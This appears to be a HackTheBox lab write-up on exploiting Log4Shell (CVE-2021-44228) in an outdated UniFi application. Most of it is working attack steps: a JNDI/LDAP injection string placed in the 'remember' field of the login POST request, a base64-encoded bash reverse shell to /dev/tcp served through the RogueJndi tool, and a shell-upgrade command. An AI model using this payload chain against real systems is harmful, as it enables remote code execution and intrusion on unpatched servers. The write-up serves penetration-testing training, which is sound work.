#hackthebox #LDAP #Log4j 

We find a unifi app, which runs with a old version. This version we figure out has the vulnerability: CVE-2021-44228

Doing some research on it: 
https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

We find out that there is a POST parameter we can use to exploit this vulnerability. 

To get a POC we try to send this POST data to the /api/login endpoint:

```
"username":"test","password":"asdasd","remember":"${jndi:ldap://10.10.14.237/test}","strict":true
```

And if we setup tcpdump to listen for ldap traffic we can verify that we get a response:

```
sudo tcpdump -i tun0 port 389
```


```shell

listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
16:09:58.552390 IP 10.129.50.226.38700 > 10.10.14.237.ldap: Flags [S], seq 4183971065, win 64240, options [mss 1362,sackOK,TS val 4117264887 ecr 0,nop,wscale 7], length 0
16:09:58.552407 IP 10.10.14.237.ldap > 10.129.50.226.38700: Flags [R.], seq 0, ack 4183971066, win 0, length 0
```

So we have a way to send input, which can exploit the vuln. 

To craft a payload to exploit it, we need java, mvn and this repo: https://github.com/veracode-research/rogue-jndi 

This is some pretty wierd stuff if you ask me, but we do:
```
echo 'bash -c bash -i >&/dev/tcp/{Your IP Address}/{A port of your choice} 0>&1' |
base64
```

```
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,BASE64 STRING HERE}|
{base64,-d}|{bash,-i}" --hostname "{YOUR TUN0 IP ADDRESS}"
```

ex.
```
java -jar target/RogueJndi-1.1.jar --command "bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
d}|{bash,-i}" --hostname "10.10.14.33"
```

This host some local LDAP server and gives us some  URIs we can use as payloads. We set up our listener, and send in this POST parameter (1 of the payloads we generated):

```
"remember":"${jndi:ldap://10.10.14.237:1389/o=tomcat}"
```

This gives us a rev shell, and the user flag. 

Getting a interactive shell:
```
script /dev/null -c bash
```